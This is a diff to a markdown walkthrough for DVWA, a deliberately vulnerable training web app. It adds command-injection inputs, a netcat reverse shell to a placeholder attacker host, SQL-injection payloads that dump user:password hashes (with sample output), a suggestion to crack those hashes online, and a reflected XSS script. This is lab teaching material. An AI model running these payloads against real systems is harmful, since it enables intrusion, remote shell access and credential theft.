@@ -310,7 +310,59 @@ password : password
 ```
 reset the database 
 
-chose option ```bash DVWA Security ``` and set it to ```bash low ``` and ```bash submit```
+chose option ```DVWA Security ``` and set it to ```low ``` and ```submit```
+
+```choose Command Injection```
+
+```bash
+127.0.0.1; ls -l
+127.0.0.1; uname -a
+```
+
+```Reverse shell```
+
+```bash
+127.0.0.1; nc -e /bin/sh attacker_ip attacker_port
+```
+
+```SQL injection```
+
+```bash
+1' OR 1=1#
+```
+
+```bash
+%' and 1=0 union select null, concat(user,':',password) from users #
+```
+
+```bash sample output  
+ID: %' and 1=0 union select null, concat(user,':',password) from users #
+
+First name: 
+
+Surname: gordonb:21232f297a57a5a743894a0e4a801fc3
+```bash
+
+Uses crackstation to crack password
+
+```Put in hashed password in https://crackstation.net/ 
+And then use the Surname from the output and  cracked password
+```
+
+```
+CSRF 
+https://medium.com/@preranakhanal42/csrf-dvwa-walkthrough-106b318c7b1f
+```
+
+```
+XSS Reflected
+```
+
+```bash
+<script>
+  var s = "surprise!</script><script>alert('hacked you!')</script>";
+</script>
+```
 
 
 
